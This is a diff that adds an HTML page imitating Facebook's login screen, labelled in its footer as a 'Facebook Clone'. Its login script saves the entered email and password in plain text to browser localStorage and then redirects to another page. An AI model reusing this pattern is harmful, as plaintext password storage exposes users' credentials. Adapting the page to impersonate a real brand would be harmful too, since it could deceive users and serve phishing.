@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login</title>
+<style>
+html, body {
+    height: 100%;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background-color: #fbfbfbf0;
+}
+
+.login-container {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.imgg{
+    flex: block;
+    flex-direction: row;
+}
+
+img{
+    margin-left: 75px;
+}
+
+.login-box {
+background-color: white;
+padding: 30px;
+box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+width: 350px;
+border-radius: 8px;
+text-align: center;
+}
+
+h2 {
+font-size: 20px;
+color: #333;
+margin-top: 10px;
+margin-bottom: 20px;
+font-weight: 100;
+}
+
+.input-group {
+margin-bottom: 10px;
+text-align: left;
+}
+
+input[type="email"], input[type="password"] {
+width: 100%;
+padding: 12px;
+margin-top: 5px;
+border: 1px solid #ccc;
+border-radius: 6px;
+font-size: 16px;
+}
+
+#email{
+    width: 325px;
+}
+
+#password{
+    width: 325px;
+}
+
+button {
+width: 100%;
+padding: 12px;
+background-color: #497ff5;
+border: none;
+border-radius: 8px;
+color: white;
+font-size: 20px;
+cursor: pointer;
+}
+
+button:hover {
+background-color: #4479ebfe;
+}
+
+.signup-option {
+margin-top: 10px;
+}
+
+.signup-option a {
+text-decoration: none;
+color: #396ddc;
+}
+
+.signup-option a:hover {
+text-decoration: underline;
+}
+
+a{
+    font-size: 14px;
+    color: #497ff5;
+}
+
+.foot{
+    margin-top: 160px;
+    text-align: center;
+    display: block;
+}
+
+.uline{
+    text-decoration: none;
+}
+
+.uline:hover{
+text-decoration: underline;
+}
+
+</style>
+</head>
+<body>
+<div class="login-container">
+<div class="imgg">
+    <img src="facebook.png"/>
+<div class="login-box">
+<h2>Log in to Facebook</h2>
+<form action="#">
+<div class="input-group">
+<input type="email" id="email" name="email" placeholder="Email address or phone number" required>
+</div>
+<div class="input-group">
+<input type="password" id="password" name="password" placeholder="Password" required>
+</div>
+<button type="button" class="login-btn" onclick="handleLogin()"><strong>Log In</strong></button>
+<div class="signup-option">
+<span><a>Forgotten account?</a> &#183; <a href="#">Sign up for Facebook</a></span>
+</div>
+</form>
+</div>
+</div>
+</div>
+
+
+<footer style="text-align: center; margin-top: 0px;height: 200px;padding: 20px 10px; background-color: #f0f2f5; color: #777; font-size: 13px;">
+    <div class="foot">
+    <p>
+      <a class="uline" href="Facebook.html" style="color: #656568; font-size: 12px;">English (UK)</a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> தமிழ் </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> తెలుగు </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> ಕನ್ನಡ </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;">اردو </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> हिन्दी </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> മലയാളം </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> සිංහල </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> ਪੰਜਾਬੀ </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> বাংলা </a>
+      <a class="uline" href="Facebook.html" style="color: #9b9b9c; font-size: 12px;"> ગુજરાતી </a>
+    </p>
+    <p>&copy; 2025 Facebook Clone. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script>
+    function handleLogin() {
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+
+      localStorage.setItem("savedEmail", email);
+      localStorage.setItem("savedPassword", password);
+
+      window.location.href = "last.html";
+    }
+    </script>
+</body>
+</html>
